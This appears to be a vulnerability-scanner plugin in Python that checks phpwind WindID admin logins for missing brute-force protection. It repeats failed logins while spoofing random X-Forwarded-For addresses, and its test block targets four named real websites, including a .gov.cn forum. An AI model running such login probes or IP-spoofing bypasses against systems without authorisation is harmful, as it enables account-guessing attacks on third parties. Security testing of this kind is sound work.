#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = phpwind windid
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-080327

import random
import re

def assign(service, arg):
    if service == 'phpwind':
        return True, arg

def audit(url):
    host = re.findall('http://(.*)/$', url)[0]
    t = 0
    for i in range(20):
        ip=str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
        header = '''POST /windid/admin.php?a=login HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:18.0) Gecko/20100101 Firefox/18.0
X-Forwarded-For: %s
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://bbs.typhoon.gov.cn/windid/admin.php
Cookie: csrf_token=efb7ee93681c6148
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

username=1&password=1&submit=&csrf_token=efb7ee93681c6148''' % (host, ip)
        code, head, body, errcode, final_url = curl.curl2(url+'windid/admin.php?a=login', raw=header)
        body = util.decode_html(head,body)
        if '<li>账号或密码错误，请重新登录</li>' in body:
            t += 1
        if i > 3 and t == 0:
            return 
    if t >= 10:
        security_warning(url+'windid/admin.php' + ' : Brute-force cracking');

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpwind', 'http://www.ymworkroom.com/')[1])
    audit(assign('phpwind', 'http://bbs.typhoon.gov.cn/')[1])
    audit(assign('phpwind', 'http://dsqlm.com/')[1])
    audit(assign('phpwind', 'http://bbs.yujiabu.com.cn/')[1])